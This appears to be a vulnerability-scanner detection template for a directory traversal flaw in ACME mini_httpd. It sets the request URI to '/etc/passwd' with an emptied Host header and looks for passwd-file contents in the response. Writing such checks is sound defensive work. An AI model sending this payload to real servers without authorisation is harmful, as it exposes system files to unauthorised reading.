#Attention! For this DSL detect you must use a custom test policy with URI_.* insertion point!

meta-info:
  - title: "ACME mini_httpd directory traversal"
  - type: "ptrav"
  - threat: 65
  - description: "ACME mini_httpd before 1.30 lets remote users read arbitrary files."
  - tags:
    - Path Traversal
    - Arbitrary File Reading

collect:
  - uniq:
    - [HEADER_HOST]

modify:
  - "HEADER_HOST_value": ""

generate:
  - into: URI_value
  - payload:
    - /etc/passwd
  - method:
    - replace

detect:
  - response:
    - body: '(root:x:)|(/bin/bash)|(/usr/sbin/nologin)'
